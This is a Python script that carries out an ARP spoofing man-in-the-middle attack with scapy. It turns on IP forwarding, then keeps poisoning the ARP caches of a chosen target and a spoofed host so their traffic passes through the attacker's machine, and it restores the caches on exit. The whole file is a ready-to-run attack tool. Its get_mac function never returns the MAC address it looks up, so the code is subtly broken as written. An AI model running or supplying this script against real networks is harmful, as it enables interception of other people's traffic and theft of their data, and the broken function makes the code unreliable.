#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse
import subprocess

# Enabling port forwarding so that the target still has an active internet connection
def e_port_forwarding():
    print("Enabling Port Forwarding ... ")
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell = True)

# This function gets the argument from the command line and also builds the help menu.
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "Enter the target machine's ip. This option is Mandatory.")
    parser.add_argument("-s", "--spoof", dest = "spoof_ip", help = "Enter the spoof ip. This option is Mandatory.")
    options= parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify target's IP, use --help for more options.")
    if not options.spoof_ip:
        parser.error("[-] Please specify spoof IP, use --help for more options. ")
    return options

# This function gets the MAC address from an ip address
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

# This function creates and sends the ARP packet
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# This function restores the MAC address after the program finishes running.
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Function calls
options = get_arguments()
e_port_forwarding()
try:
    send_packets_count = 0
    # Put the function call in a while loop to send the same packets repeatedly to not loose the connection.
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        send_packets_count +=2
        print("\r[+] Packets Sent : " + str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

# Exception block for Ctrl + c to quit the program and restore the connection.
except(KeyboardInterrupt):
    print("\n[-] Ctrl + C pressed ......... Quiting the Program...... \n")
    print("Restoring ARP ...... \n")
    restore(options.spoof_ip, options.target_ip)
    restore(options.target_ip, options.spoof_ip)

